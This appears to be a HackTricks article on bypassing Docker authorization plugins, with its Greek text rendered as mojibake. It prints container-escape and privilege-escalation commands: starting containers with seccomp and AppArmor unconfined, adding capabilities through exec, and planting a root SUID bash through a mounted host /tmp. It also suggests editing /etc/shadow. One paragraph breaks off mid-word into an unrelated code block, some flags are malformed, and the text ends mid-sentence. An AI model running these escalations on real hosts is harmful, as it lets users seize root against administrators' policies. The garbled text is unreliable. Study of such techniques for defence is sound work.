<details>

<summary><strong>ÎœÎ¬Î¸ÎµÏ„Îµ Ï„Î¿ Ï‡Î¬ÎºÎ¹Î½Î³Îº Ï„Î¿Ï… AWS Î±Ï€ÏŒ Ï„Î¿ Î¼Î·Î´Î­Î½ Î¼Î­Ï‡ÏÎ¹ Ï„Î¿Î½ Î®ÏÏ‰Î± Î¼Îµ Ï„Î¿</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Î†Î»Î»Î¿Î¹ Ï„ÏÏŒÏ€Î¿Î¹ Î³Î¹Î± Î½Î± Ï…Ï€Î¿ÏƒÏ„Î·ÏÎ¯Î¾ÎµÏ„Îµ Ï„Î¿ HackTricks:

* Î•Î¬Î½ Î¸Î­Î»ÎµÏ„Îµ Î½Î± Î´ÎµÎ¯Ï„Îµ Ï„Î·Î½ **ÎµÏ„Î±Î¹ÏÎµÎ¯Î± ÏƒÎ±Ï‚ Î½Î± Î´Î¹Î±Ï†Î·Î¼Î¯Î¶ÎµÏ„Î±Î¹ ÏƒÏ„Î¿ HackTricks** Î® Î½Î± **ÎºÎ±Ï„ÎµÎ²Î¬ÏƒÎµÏ„Îµ Ï„Î¿ HackTricks ÏƒÎµ Î¼Î¿ÏÏ†Î® PDF** ÎµÎ»Î­Î³Î¾Ï„Îµ Ï„Î± [**Î£Î§Î•Î”Î™Î‘ Î£Î¥ÎÎ”Î¡ÎŸÎœÎ—Î£**](https://github.com/sponsors/carlospolop)!
* Î‘Ï€Î¿ÎºÏ„Î®ÏƒÏ„Îµ Ï„Î¿ [**ÎµÏ€Î¯ÏƒÎ·Î¼Î¿ PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Î‘Î½Î±ÎºÎ±Î»ÏÏˆÏ„Îµ [**Ï„Î·Î½ ÎŸÎ¹ÎºÎ¿Î³Î­Î½ÎµÎ¹Î± PEASS**](https://opensea.io/collection/the-peass-family), Ï„Î· ÏƒÏ…Î»Î»Î¿Î³Î® Î¼Î±Ï‚ Î±Ï€ÏŒ Î±Ï€Î¿ÎºÎ»ÎµÎ¹ÏƒÏ„Î¹ÎºÎ¬ [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Î•Î³Î³ÏÎ±Ï†ÎµÎ¯Ï„Îµ ÏƒÏ„Î·** ğŸ’¬ [**Î¿Î¼Î¬Î´Î± Discord**](https://discord.gg/hRep4RUj7f) Î® ÏƒÏ„Î· [**Î¿Î¼Î¬Î´Î± telegram**](https://t.me/peass) Î® **Î±ÎºÎ¿Î»Î¿Ï…Î¸Î®ÏƒÏ„Îµ** Î¼Î±Ï‚ ÏƒÏ„Î¿ **Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **ÎœÎ¿Î¹ÏÎ±ÏƒÏ„ÎµÎ¯Ï„Îµ Ï„Î± Ï‡Î¬ÎºÎ¹Î½Î³Îº ÎºÏŒÎ»Ï€Î± ÏƒÎ±Ï‚ Ï…Ï€Î¿Î²Î¬Î»Î»Î¿Î½Ï„Î±Ï‚ PRs ÏƒÏ„Î±** [**HackTricks**](https://github.com/carlospolop/hacktricks) ÎºÎ±Î¹ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) Î±Ï€Î¿Î¸ÎµÏ„Î®ÏÎ¹Î± Ï„Î¿Ï… github.

</details>


Î¤Î¿ Ï€ÏÎ¿ÎµÏ€Î¹Î»ÎµÎ³Î¼Î­Î½Î¿ Î¼Î¿Î½Ï„Î­Î»Î¿ **ÎµÎ¾Î¿Ï…ÏƒÎ¹Î¿Î´ÏŒÏ„Î·ÏƒÎ·Ï‚** Ï„Î¿Ï… Docker ÎµÎ¯Î½Î±Î¹ **ÏŒÎ»Î± Î® Ï„Î¯Ï€Î¿Ï„Î±**. ÎŸÏ€Î¿Î¹Î¿ÏƒÎ´Î®Ï€Î¿Ï„Îµ Ï‡ÏÎ®ÏƒÏ„Î·Ï‚ Î¼Îµ Î¬Î´ÎµÎ¹Î± Ï€ÏÏŒÏƒÎ²Î±ÏƒÎ·Ï‚ ÏƒÏ„Î¿Î½ Docker daemon Î¼Ï€Î¿ÏÎµÎ¯ Î½Î± ÎµÎºÏ„ÎµÎ»Î­ÏƒÎµÎ¹ Î¿Ï€Î¿Î¹Î±Î´Î®Ï€Î¿Ï„Îµ ÎµÎ½Ï„Î¿Î»Î® Ï€ÎµÎ»Î¬Ï„Î· Docker. Î¤Î¿ Î¯Î´Î¹Î¿ Î¹ÏƒÏ‡ÏÎµÎ¹ Î³Î¹Î± Ï„Î¿Ï…Ï‚ ÎºÎ±Î»Î¿ÏÎ½Ï„ÎµÏ‚ Ï€Î¿Ï… Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹Î¿ÏÎ½ Ï„Î¿ Engine API Ï„Î¿Ï… Docker Î³Î¹Î± Î½Î± ÎµÏ€Î¹ÎºÎ¿Î¹Î½Ï‰Î½Î®ÏƒÎ¿Ï…Î½ Î¼Îµ Ï„Î¿Î½ daemon. Î•Î¬Î½ Ï‡ÏÎµÎ¹Î¬Î¶ÎµÏƒÏ„Îµ **Î¼ÎµÎ³Î±Î»ÏÏ„ÎµÏÎ¿ Î­Î»ÎµÎ³Ï‡Î¿ Ï€ÏÏŒÏƒÎ²Î±ÏƒÎ·Ï‚**, Î¼Ï€Î¿ÏÎµÎ¯Ï„Îµ Î½Î± Î´Î·Î¼Î¹Î¿Ï…ÏÎ³Î®ÏƒÎµÏ„Îµ **Ï€ÏÏŒÏƒÎ¸ÎµÏ„Î± ÎµÎ¾Î¿Ï…ÏƒÎ¹Î¿Î´ÏŒÏ„Î·ÏƒÎ·Ï‚** ÎºÎ±Î¹ Î½Î± Ï„Î± Ï€ÏÎ¿ÏƒÎ¸Î­ÏƒÎµÏ„Îµ ÏƒÏ„Î· Î´Î¹Î±Î¼ÏŒÏÏ†Ï‰ÏƒÎ· Ï„Î¿Ï… Docker daemon. Î§ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹ÏÎ½Ï„Î±Ï‚ Î­Î½Î± Ï€ÏÏŒÏƒÎ¸ÎµÏ„Î¿ ÎµÎ¾Î¿Ï…ÏƒÎ¹Î¿Î´ÏŒÏ„Î·ÏƒÎ·Ï‚, Î­Î½Î±Ï‚ Î´Î¹Î±Ï‡ÎµÎ¹ÏÎ¹ÏƒÏ„Î®Ï‚ Docker Î¼Ï€Î¿ÏÎµÎ¯ Î½Î± **Î´Î¹Î±Î¼Î¿ÏÏ†ÏÏƒÎµÎ¹ Î»ÎµÏ€Ï„Î¿Î¼ÎµÏÎµÎ¯Ï‚ Ï€Î¿Î»Î¹Ï„Î¹ÎºÎ­Ï‚ Ï€ÏÏŒÏƒÎ²Î±ÏƒÎ·Ï‚** Î³Î¹Î± Ï„Î· Î´Î¹Î±Ï‡ÎµÎ¯ÏÎ¹ÏƒÎ· Ï„Î·Ï‚ Ï€ÏÏŒÏƒÎ²Î±ÏƒÎ·Ï‚ ÏƒÏ„Î¿Î½ Docker daemon.

# Î’Î±ÏƒÎ¹ÎºÎ® Î±ÏÏ‡Î¹Ï„ÎµÎºÏ„Î¿Î½Î¹ÎºÎ®

Î¤Î± Ï€ÏÏŒÏƒÎ¸ÎµÏ„Î± ÎµÎ¾Î¿Ï…ÏƒÎ¹Î¿Î´ÏŒÏ„Î·ÏƒÎ·Ï‚ Ï„Î¿Ï… Docker ÎµÎ¯Î½Î±Î¹ **ÎµÎ¾Ï‰Ï„ÎµÏÎ¹ÎºÎ¬ Ï€ÏÏŒÏƒÎ¸ÎµÏ„Î±** Ï€Î¿Ï… Î¼Ï€Î¿ÏÎµÎ¯Ï„Îµ Î½Î± Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹Î®ÏƒÎµÏ„Îµ Î³Î¹Î± Î½Î± **ÎµÏ€Î¹Ï„ÏÎ­ÏˆÎµÏ„Îµ/Î±Ï€Î±Î³Î¿ÏÎµÏÏƒÎµÏ„Îµ** **ÎµÎ½Î­ÏÎ³ÎµÎ¹ÎµÏ‚** Ï€Î¿Ï… Î¶Î·Ï„Î¿ÏÎ½Ï„Î±Î¹ Î±Ï€ÏŒ Ï„Î¿Î½ Docker Daemon Î±Î½Î¬Î»Î¿Î³Î± Î¼Îµ Ï„Î¿Î½ Ï‡ÏÎ®ÏƒÏ„Î· Ï€Î¿Ï… Ï„Î¿ Î¶Î®Ï„Î·ÏƒÎµ ÎºÎ±Î¹ Ï„Î·Î½ ÎµÎ½Î­ÏÎ³ÎµÎ¹Î± Ï€Î¿Ï… Î¶Î·Ï„Î®Î¸Î·ÎºÎµ.

**[ÎŸÎ¹ Ï€Î±ÏÎ±ÎºÎ¬Ï„Ï‰ Ï€Î»Î·ÏÎ¿Ï†Î¿ÏÎ¯ÎµÏ‚ Ï€ÏÎ¿Î­ÏÏ‡Î¿Î½Ï„Î±Î¹ Î±Ï€ÏŒ Ï„Î± Î­Î³Î³ÏÎ±Ï†Î±](https://docs.docker.com/engine/extend/plugins_authorization/#:~:text=If%20you%20require%20greater%20access,access%20to%20the%20Docker%20daemon)**

ÎŒÏ„Î±Î½ Î³Î¯Î½ÎµÏ„Î±Î¹ Î¼Î¹Î± **HTTP** Î±Î¯Ï„Î·ÏƒÎ· ÏƒÏ„Î¿Î½ Docker **daemon** Î¼Î­ÏƒÏ‰ Ï„Î¿Ï… CLI Î® Î¼Î­ÏƒÏ‰ Ï„Î¿Ï… Engine API, Ï„Î¿ **Ï…Ï€Î¿ÏƒÏÏƒÏ„Î·Î¼Î± Ï€Î¹ÏƒÏ„Î¿Ï€Î¿Î¯Î·ÏƒÎ·Ï‚** Ï€ÎµÏÎ½Î¬ Ï„Î·Î½ Î±Î¯Ï„Î·ÏƒÎ· ÏƒÏ„Î¿ ÎµÎ³ÎºÎ±Ï„ÎµÏƒÏ„Î·Î¼Î­Î½Î¿ **Ï€ÏÏŒÏƒÎ¸ÎµÏ„Î¿ Ï€Î¹ÏƒÏ„Î¿Ï€Î¿Î¯Î·ÏƒÎ·Ï‚**. Î— Î±Î¯Ï„Î·ÏƒÎ· Ï€ÎµÏÎ¹Î­Ï‡ÎµÎ¹ Ï„Î¿Î½ Ï‡ÏÎ®ÏƒÏ„Î· (ÎºÎ±Î»Î¿ÏÎ½Ï„Î±) ÎºÎ±Î¹ Ï„Î¿ Ï€Î»Î±Î¯ÏƒÎ¹Î¿ ÎµÎ½Ï„Î¿Î»ÏÎ½. Î¤Î¿ Ï€ÏÏŒÏƒÎ¸ÎµÏ„Î¿ ÎµÎ¯Î½Î±Î¹ Ï…Ï€ÎµÏÎ¸Ï…Î½Î¿ Î³Î¹Î± Ï„Î¿Î½ ÎºÎ±Î¸Î¿ÏÎ¹ÏƒÎ¼ÏŒ ÎµÎ¬Î½ Î¸Î± ÎµÏ€Î¹Ï„ÏÎ­ÏˆÎµÎ¹ Î® Î¸Î± Î±Ï€Î¿ÏÏÎ¯ÏˆÎµÎ¹ Ï„Î·Î½ Î±Î¯Ï„Î·ÏƒÎ·.

Î¤Î± Ï€Î±ÏÎ±ÎºÎ¬Ï„Ï‰ Î´Î¹Î±Î³ÏÎ¬Î¼Î¼Î±Ï„Î± Î±ÎºÎ¿Î»Î¿Ï…Î¸Î¿ÏÎ½ Ï„Î· ÏÎ¿Î® ÎµÎ¾Î¿Ï…ÏƒÎ¹Î¿Î´ÏŒÏ„Î·ÏƒÎ·Ï‚ Î³Î¹Î± Ï„Î·Î½ ÎµÏ€Î¹Ï„ÏÎµÏ€Ï„Î® ÎºÎ±Î¹ Ï„Î·Î½ Î±Ï€Î¿ÏÏÎ¹Ï€Ï„Î¹ÎºÎ® ÏÎ¿Î®:

![Î¡Î¿Î® ÎµÏ€Î¹Ï„ÏÎµÏ€Ï„Î®Ï‚ ÎµÎ¾Î¿Ï…ÏƒÎ¹Î¿Î´ÏŒÏ„Î·ÏƒÎ·Ï‚](https://docs.docker.com/engine/extend/images/authz\_allow.png)

![Î¡Î¿Î® Î±Ï€Î¿ÏÏÎ¹Ï€Ï„Î¹ÎºÎ®Ï‚ ÎµÎ¾Î¿Ï…ÏƒÎ¹Î¿Î´ÏŒÏ„Î·ÏƒÎ·Ï‚](https://docs.docker.com/engine/extend/images/authz\_deny.png)

ÎšÎ¬Î¸Îµ Î±Î¯Ï„Î·ÏƒÎ· Ï€Î¿Ï… ÏƒÏ„Î­Î»Î½ÎµÏ„Î±Î¹ ÏƒÏ„Î¿ Ï€ÏÏŒÏƒÎ¸ÎµÏ„Î¿ **Ï€ÎµÏÎ¹Î»Î±Î¼Î²Î¬Î½ÎµÎ¹ Ï„Î¿Î½ ÎµÎ¾Î¿Ï…ÏƒÎ¹Î¿Î´Î¿Ï„Î·Î¼Î­Î½Î¿ Ï‡ÏÎ®ÏƒÏ„Î·, Ï„Î¹Ï‚ ÎºÎµÏ†Î±Î»Î¯Î´ÎµÏ‚ HTTP ÎºÎ±Î¹ Ï„Î¿ ÏƒÏÎ¼Î± Ï„Î·Ï‚ Î±Î¯Ï„Î·ÏƒÎ·Ï‚/Î±Ï€ÏŒÎºÏÎ¹ÏƒÎ·Ï‚**. ÎœÏŒÎ½Î¿ Ï„Î¿ **ÏŒÎ½Î¿Î¼Î± Ï‡ÏÎ®ÏƒÏ„Î·** ÎºÎ±Î¹ Î· **Î¼Î­Î¸Î¿Î´Î¿Ï‚ Ï€Î¹ÏƒÏ„Î¿Ï€Î¿Î¯Î·ÏƒÎ·Ï‚** Ï€Î¿Ï… Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹Î®Î¸Î·ÎºÎµ Ï€ÎµÏÎ½Î¹Î¿ÏÎ½Ï„Î±Î¹ ÏƒÏ„Î¿ Ï€ÏÏŒÏƒÎ¸ÎµÏ„Î¿. Î¤Î¿ Ï€Î¹Î¿ ÏƒÎ·Î¼Î±Î½Ï„Î¹ÎºÏŒ, **Î´ÎµÎ½ Ï€ÎµÏÎ½Î¹Î¿ÏÎ½Ï„Î±Î¹ Î´Î¹Î±Ï€Î¹ÏƒÏ„ÎµÏ…Ï„Î®ÏÎ¹Î± Ï‡ÏÎ®ÏƒÏ„Î· Î® Î´Î¹Î±ÎºÏÎ¹Ï„Î¹ÎºÎ¬**. Î¤Î­Î»Î¿Ï‚, **Î´ÎµÎ½ ÏŒÎ»Î± Ï„Î± ÏƒÏÎ¼Î±Ï„Î± Î±Î¹Ï„Î®ÏƒÎµÏ‰Î½/Î±Ï€Î¿ÎºÏÎ¯ÏƒÎµÏ‰Î½ Î±Ï€Î¿ÏƒÏ„Î­Î»Î»Î¿Î½Ï„Î±Î¹** ÏƒÏ„Î¿ Ï€ÏÏŒÏƒÎ¸ÎµÏ„Î¿ ÎµÎ¾Î¿Ï…ÏƒÎ¹Î¿Î´ÏŒÏ„Î·ÏƒÎ·Ï‚. Î‘Ï€Î¿ÏƒÏ„Î­Î»Î»Î¿Î½Ï„Î±Î¹ Î¼ÏŒÎ½Î¿ ÎµÎºÎµÎ¯Î½Î± Ï„Î± ÏƒÏÎ¼Î±Ï„Î± Î±Î¹Ï„Î®ÏƒÎµÏ‰Î½/Î±Ï€Î¿ÎºÏÎ¯ÏƒÎµÏ‰Î½ ÏŒÏ€Î¿Ï… Ï„Î¿ `Content-Type` ÎµÎ¯Î½Î±Î¹ ÎµÎ¯Ï„Îµ `text/*` ÎµÎ¯Ï„Îµ `application/json`.

Î“Î¹Î± ÎµÎ½Ï„Î¿Î»Î­Ï‚ Ï€Î¿Ï… Î¼Ï€Î¿ÏÎ¿ÏÎ½ Ï€Î¹Î¸Î±Î½ÏÏ‚ Î½Î± ÎºÎ±Ï„Î±Î»Î¬Î²Î¿Ï…Î½ Ï„Î· ÏƒÏÎ½Î´ÎµÏƒÎ· HTTP (`HTTP Upgrade`), ÏŒÏ€Ï‰Ï‚ Î· `exec`, Ï„Î¿ Ï€ÏÏŒÏƒÎ¸ÎµÏ„Î¿ ÎµÎ¾Î¿Ï…ÏƒÎ¹Î¿Î´ÏŒÏ„Î·ÏƒÎ·Ï‚ ÎºÎ±Î»ÎµÎ¯Ï„Î±Î¹ Î¼ÏŒÎ½Î¿ Î³Î¹Î± Ï„Î¹Ï‚ Î±ÏÏ‡Î¹ÎºÎ­Ï‚ Î±Î¹Ï„Î®ÏƒÎµÎ¹Ï‚ HTTP. Î‘Ï†Î¿Ï Ï„Î¿ Ï€ÏÏŒÏƒÎ¸ÎµÏ„Î¿ ÎµÎ³ÎºÏÎ¯Î½ÎµÎ¹ Ï„Î·Î½ ÎµÎ½Ï„Î¿Î»Î®, Î· ÎµÎ¾Î¿Ï…ÏƒÎ¹Î¿Î´ÏŒÏ„Î·ÏƒÎ· Î´ÎµÎ½ ÎµÏ†Î±ÏÎ¼ÏŒÎ¶ÎµÏ„Î±Î¹ ÏƒÏ„Î¿ Ï…Ï€ÏŒÎ»Î¿Î¹Ï€Î¿ Ï„Î·Ï‚ ÏÎ¿Î®Ï‚. Î•Î¹Î´Î¹ÎºÏŒÏ„ÎµÏÎ±, Ï„Î± Î´ÎµÎ´Î¿Î¼Î­Î½Î± ÏÎ¿Î®Ï‚ Î´ÎµÎ½ Ï€ÎµÏÎ½Î¹
```bash
docker run --rm -it --cap-add=SYS_ADMIN --security-opt apparmor=unconfined ubuntu bash
```
### Î•ÎºÏ„Î­Î»ÎµÏƒÎ· ÎµÎ½ÏŒÏ‚ container ÎºÎ±Î¹ ÏƒÏ„Î· ÏƒÏ…Î½Î­Ï‡ÎµÎ¹Î± Î±Ï€ÏŒÎºÏ„Î·ÏƒÎ· Ï€ÏÎ¿Î½Î¿Î¼Î¹Î¿ÏÏ‡Î¿Ï… ÏƒÏ…Î½ÎµÎ´ÏÎ¯Î±Ï‚

Î£Îµ Î±Ï…Ï„Î®Î½ Ï„Î·Î½ Ï€ÎµÏÎ¯Ï€Ï„Ï‰ÏƒÎ·, Î¿ ÏƒÏ…ÏƒÏ„Î·Î¼Î¹ÎºÏŒÏ‚ Î´Î¹Î±Ï‡ÎµÎ¹ÏÎ¹ÏƒÏ„Î®Ï‚ **Î±Ï€Î±Î³ÏŒÏÎµÏ…ÏƒÎµ ÏƒÏ„Î¿Ï…Ï‚ Ï‡ÏÎ®ÏƒÏ„ÎµÏ‚ Î½Î± Ï„Î¿Ï€Î¿Î¸ÎµÏ„Î¿ÏÎ½ ÏŒÎ³ÎºÎ¿Ï…Ï‚ ÎºÎ±Î¹ Î½Î± ÎµÎºÏ„ÎµÎ»Î¿ÏÎ½ containers Î¼Îµ Ï„Î·Î½ Ï€Î±ÏÎ¬Î¼ÎµÏ„ÏÎ¿ `--privileged` Î® Î½Î± Ï€Î±ÏÎ­Ï‡Î¿Ï…Î½ Î¿Ï€Î¿Î¹Î±Î´Î®Ï€Î¿Ï„Îµ ÎµÏ€Î¹Ï€Î»Î­Î¿Î½ Î´Ï…Î½Î±Ï„ÏŒÏ„Î·Ï„Î± ÏƒÏ„Î¿ container**:
```bash
docker run -d --privileged modified-ubuntu
docker: Error response from daemon: authorization denied by plugin customauth: [DOCKER FIREWALL] Specified Privileged option value is Disallowed.
See 'docker run --help'.
```
Î©ÏƒÏ„ÏŒÏƒÎ¿, Î­Î½Î±Ï‚ Ï‡ÏÎ®ÏƒÏ„Î·Ï‚ Î¼Ï€Î¿ÏÎµÎ¯ Î½Î± **Î´Î·Î¼Î¹Î¿Ï…ÏÎ³Î®ÏƒÎµÎ¹ Î­Î½Î± ÎºÎ­Î»Ï…Ï†Î¿Ï‚ Î¼Î­ÏƒÎ± ÏƒÏ„Î¿ ÎµÎºÏ„ÎµÎ»Î¿ÏÎ¼ÎµÎ½Î¿ container ÎºÎ±Î¹ Î½Î± Ï„Î¿Ï… Î´ÏÏƒÎµÎ¹ ÎµÏ€Î¹Ï€Î»Î­Î¿Î½ Ï€ÏÎ¿Î½ÏŒÎ¼Î¹Î±**:
```bash
docker run -d --security-opt seccomp=unconfined --security-opt apparmor=unconfined ubuntu
#bb72293810b0f4ea65ee8fd200db418a48593c1a8a31407be6fee0f9f3e4f1de

# Now you can run a shell with --privileged
docker exec -it privileged bb72293810b0f4ea65ee8fd200db418a48593c1a8a31407be6fee0f9f3e4f1de bash
# With --cap-add=ALL
docker exec -it ---cap-add=ALL bb72293810b0f4ea65ee8fd200db418a48593c1a8a31407be6fee0f9f3e4 bash
# With --cap-add=SYS_ADMIN
docker exec -it ---cap-add=SYS_ADMIN bb72293810b0f4ea65ee8fd200db418a48593c1a8a31407be6fee0f9f3e4 bash
```
Î¤ÏÏÎ±, Î¿ Ï‡ÏÎ®ÏƒÏ„Î·Ï‚ Î¼Ï€Î¿ÏÎµÎ¯ Î½Î± Î´ÏÎ±Ï€ÎµÏ„ÎµÏÏƒÎµÎ¹ Î±Ï€ÏŒ Ï„Î¿ container Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹ÏÎ½Ï„Î±Ï‚ Î¿Ï€Î¿Î¹Î±Î´Î®Ï€Î¿Ï„Îµ Î±Ï€ÏŒ Ï„Î¹Ï‚ [**Ï€ÏÎ¿Î·Î³Î¿Ï…Î¼Î­Î½Ï‰Ï‚ ÏƒÏ…Î¶Î·Ï„Î·Î¸ÎµÎ¯ÏƒÎµÏ‚ Ï„ÎµÏ‡Î½Î¹ÎºÎ­Ï‚**](./#privileged-flag) ÎºÎ±Î¹ Î½Î± **Î±Î½Î±Î²Î±Î¸Î¼Î¯ÏƒÎµÎ¹ Ï„Î± Î´Î¹ÎºÎ±Î¹ÏÎ¼Î±Ï„Î±** Î¼Î­ÏƒÎ± ÏƒÏ„Î¿Î½ host.

## Î ÏÎ¿ÏƒÎ¬ÏÏ„Î·ÏƒÎ· ÎµÎ³Î³ÏÎ¬ÏˆÎ¹Î¼Î¿Ï… Ï†Î±ÎºÎ­Î»Î¿Ï…

Î£Îµ Î±Ï…Ï„Î®Î½ Ï„Î·Î½ Ï€ÎµÏÎ¯Ï€Ï„Ï‰ÏƒÎ·, Î¿ ÏƒÏ…ÏƒÏ„Î·Î¼Î¹ÎºÏŒÏ‚ Î´Î¹Î±Ï‡ÎµÎ¹ÏÎ¹ÏƒÏ„Î®Ï‚ **Î±Ï€Î±Î³ÏŒÏÎµÏ…ÏƒÎµ ÏƒÏ„Î¿Ï…Ï‚ Ï‡ÏÎ®ÏƒÏ„ÎµÏ‚ Î½Î± ÎµÎºÏ„ÎµÎ»Î¿ÏÎ½ containers Î¼Îµ Ï„Î·Î½ ÏƒÎ·Î¼Î±Î¯Î± `--privileged`** Î® Î½Î± Î´Î¯Î½Î¿Ï…Î½ Î¿Ï€Î¿Î¹Î±Î´Î®Ï€Î¿Ï„Îµ ÎµÏ€Î¹Ï€Î»Î­Î¿Î½ Î´Ï…Î½Î±Ï„ÏŒÏ„Î·Ï„Î± ÏƒÏ„Î¿ container, ÎºÎ±Î¹ ÎµÏ€Î­Ï„ÏÎµÏˆÎµ Î¼ÏŒÎ½Î¿ Ï„Î·Î½ Ï€ÏÎ¿ÏƒÎ¬ÏÏ„Î·ÏƒÎ· Ï„Î¿Ï… Ï†Î±ÎºÎ­Î»Î¿Ï… `/tmp`:
```bash
host> cp /bin/bash /tmp #Cerate a copy of bash
host> docker run -it -v /tmp:/host ubuntu:18.04 bash #Mount the /tmp folder of the host and get a shell
docker container> chown root:root /host/bash
docker container> chmod u+s /host/bash
host> /tmp/bash
-p #This will give you a shell as root
```
{% hint style="info" %}
Î£Î·Î¼ÎµÎ¯Ï‰ÏƒÎ· ÏŒÏ„Î¹ Î¯ÏƒÏ‰Ï‚ Î´ÎµÎ½ Î¼Ï€Î¿ÏÎµÎ¯Ï„Îµ Î½Î± Ï€ÏÎ¿ÏƒÎ±ÏÏ„Î®ÏƒÎµÏ„Îµ Ï„Î¿Î½ Ï†Î¬ÎºÎµÎ»Î¿ `/tmp` Î±Î»Î»Î¬ Î¼Ï€Î¿ÏÎµÎ¯Ï„Îµ Î½Î± Ï€ÏÎ¿ÏƒÎ±ÏÏ„Î®ÏƒÎµÏ„Îµ Î­Î½Î±Î½ **Î´Î¹Î±Ï†Î¿ÏÎµÏ„Î¹ÎºÏŒ ÎµÎ³Î³ÏÎ¬ÏˆÎ¹Î¼Î¿ Ï†Î¬ÎºÎµÎ»Î¿**. ÎœÏ€Î¿ÏÎµÎ¯Ï„Îµ Î½Î± Î²ÏÎµÎ¯Ï„Îµ ÎµÎ³Î³ÏÎ¬ÏˆÎ¹Î¼Î¿Ï…Ï‚ Ï†Î±ÎºÎ­Î»Î¿Ï…Ï‚ Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹ÏÎ½Ï„Î±Ï‚: `find / -writable -type d 2>/dev/null`

**Î£Î·Î¼ÎµÎ¹ÏÏƒÏ„Îµ ÏŒÏ„Î¹ ÏŒÏ‡Î¹ ÏŒÎ»Î¿Î¹ Î¿Î¹ Ï†Î¬ÎºÎµÎ»Î¿Î¹ ÏƒÎµ Î­Î½Î± Î¼Î·Ï‡Î¬Î½Î·Î¼Î± Linux Î¸Î± Ï…Ï€Î¿ÏƒÏ„Î·ÏÎ¯Î¶Î¿Ï…Î½ Ï„Î¿ suid bit!** Î“Î¹Î± Î½Î± ÎµÎ»Î­Î³Î¾ÎµÏ„Îµ Ï€Î¿Î¹Î¿Î¹ Ï†Î¬ÎºÎµÎ»Î¿Î¹ Ï…Ï€Î¿ÏƒÏ„Î·ÏÎ¯Î¶Î¿Ï…Î½ Ï„Î¿ suid bit, ÎµÎºÏ„ÎµÎ»Î­ÏƒÏ„Îµ `mount | grep -v "nosuid"` Î“Î¹Î± Ï€Î±ÏÎ¬Î´ÎµÎ¹Î³Î¼Î±, ÏƒÏ…Î½Î®Î¸Ï‰Ï‚ Î¿Î¹ Ï†Î¬ÎºÎµÎ»Î¿Î¹ `/dev/shm`, `/run`, `/proc`, `/sys/fs/cgroup` ÎºÎ±Î¹ `/var/lib/lxcfs` Î´ÎµÎ½ Ï…Ï€Î¿ÏƒÏ„Î·ÏÎ¯Î¶Î¿Ï…Î½ Ï„Î¿ suid bit.

Î£Î·Î¼ÎµÎ¹ÏÏƒÏ„Îµ ÎµÏ€Î¯ÏƒÎ·Ï‚ ÏŒÏ„Î¹ Î±Î½ Î¼Ï€Î¿ÏÎµÎ¯Ï„Îµ Î½Î± **Ï€ÏÎ¿ÏƒÎ±ÏÏ„Î®ÏƒÎµÏ„Îµ Ï„Î¿Î½ Ï†Î¬ÎºÎµÎ»Î¿ `/etc`** Î® Î¿Ï€Î¿Î¹Î¿Î½Î´Î®Ï€Î¿Ï„Îµ Î¬Î»Î»Î¿ Ï†Î¬ÎºÎµÎ»Î¿ **Ï€ÎµÏÎ¹Î­Ï‡ÎµÎ¹ Î±ÏÏ‡ÎµÎ¯Î± ÏÏ…Î¸Î¼Î¯ÏƒÎµÏ‰Î½**, Î¼Ï€Î¿ÏÎµÎ¯Ï„Îµ Î½Î± Ï„Î± Ï„ÏÎ¿Ï€Î¿Ï€Î¿Î¹Î®ÏƒÎµÏ„Îµ Î±Ï€ÏŒ Ï„Î¿ docker container Ï‰Ï‚ root Î³Î¹Î± Î½Î± **ÎºÎ±Ï„Î±Ï‡ÏÎ±ÏƒÏ„ÎµÎ¯Ï„Îµ Ï„Î± Î´Î¹ÎºÎ±Î¹ÏÎ¼Î±Ï„Î±** ÏƒÏ„Î¿Î½ ÎºÎµÎ½Ï„ÏÎ¹ÎºÏŒ Ï…Ï€Î¿Î»Î¿Î³Î¹ÏƒÏ„Î® (Î¯ÏƒÏ‰Ï‚ Ï„ÏÎ¿Ï€Î¿Ï€Î¿Î¹ÏÎ½Ï„Î±Ï‚ Ï„Î¿ `/etc/shadow`)
{% endhint %}

## ÎœÎ· ÎµÎ»ÎµÎ³Î¼Î­Î½Î¿ API Endpoint

Î— ÎµÏ…Î¸ÏÎ½Î· Ï„Î¿Ï… ÏƒÏ…ÏƒÏ„Î·Î¼Î¹ÎºÎ¿Ï Î´Î¹Î±Ï‡ÎµÎ¹ÏÎ¹ÏƒÏ„Î® Ï€Î¿Ï… ÏÏ…Î¸Î¼Î¯Î¶ÎµÎ¹ Î±Ï…Ï„ÏŒ Ï„Î¿ Ï€ÏÏŒÏƒÎ¸ÎµÏ„Î¿ Î¸Î± Î®Ï„Î±Î½ Î½Î± ÎµÎ»Î­Î³Î¾ÎµÎ¹ Ï€Î¿Î¹ÎµÏ‚ ÎµÎ½Î­ÏÎ³ÎµÎ¹ÎµÏ‚ ÎºÎ±Î¹ Î¼Îµ Ï€Î¿Î¹Î± Î´Î¹ÎºÎ±Î¹ÏÎ¼Î±Ï„Î± Î¼Ï€Î¿ÏÎµÎ¯ Î½Î± ÎµÎºÏ„ÎµÎ»Î­ÏƒÎµÎ¹ ÎºÎ¬Î¸Îµ Ï‡ÏÎ®ÏƒÏ„Î·Ï‚. Î•Ï€Î¿Î¼Î­Î½Ï‰Ï‚, Î±Î½ Î¿ Î´Î¹Î±Ï‡ÎµÎ¹ÏÎ¹ÏƒÏ„Î®Ï‚ Î±ÎºÎ¿Î»Î¿Ï…Î¸Î®ÏƒÎµÎ¹ Î¼Î¹Î± Ï€ÏÎ¿ÏƒÎ­Î³Î³Î¹ÏƒÎ· **Î¼Î±ÏÏÎ·Ï‚ Î»Î¯ÏƒÏ„Î±Ï‚** Î¼Îµ Ï„Î± ÏƒÎ·Î¼ÎµÎ¯Î± Ï€ÏÏŒÏƒÎ²Î±ÏƒÎ·Ï‚ ÎºÎ±Î¹ Ï„Î± Ï‡Î±ÏÎ±ÎºÏ„Î·ÏÎ¹ÏƒÏ„Î¹ÎºÎ¬, 